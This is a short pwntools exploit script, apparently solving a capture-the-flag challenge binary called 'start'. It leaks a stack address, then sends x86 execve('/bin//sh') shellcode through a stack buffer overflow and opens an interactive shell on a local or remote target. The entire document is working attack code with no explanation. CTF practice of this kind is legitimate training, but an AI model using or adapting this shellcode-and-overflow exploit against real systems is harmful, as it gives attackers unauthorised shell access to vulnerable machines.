from pwn import *

def start(argv=[], *a, **kw):
	if args.GDB:
		return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
	elif args.REMOTE:
		return remote(sys.argv[1], sys.argv[2], *a, **kw)
	else:
		return process([exe] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
r
continue
'''.format(**locals())

exe = './start'

elf = context.binary = ELF(exe)

sla  = lambda r, s: conn.sendlineafter(r, s)
sl   = lambda    s: conn.sendline(s)
sa   = lambda r, s: conn.sendafter(r, s)
se   = lambda s: conn.send(s)
ru   = lambda r, **kwargs: conn.recvuntil(r, **kwargs)
rl   = lambda : conn.recvline()
uu32 = lambda d: u32(d.ljust(4, b'\x00'))
uu64 = lambda d: u64(d.ljust(8, b'\x00'))

conn = start()

add = 0x8048087

shellcode = b"\x31\xC9\x31\xD2\xB0\x0B\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\xCD\x80"

sa(b'CTF:', shellcode + p32(add))

leak = conn.recv()

leak_stack = u32(leak[0:4].ljust(4, b'\x00'))

print(hex(leak_stack))

pause()

sl(b'A' * 0x14 + p32(leak_stack - 0x1c) + p32(0))

#print(hex(leak_stack))

conn.interactive()

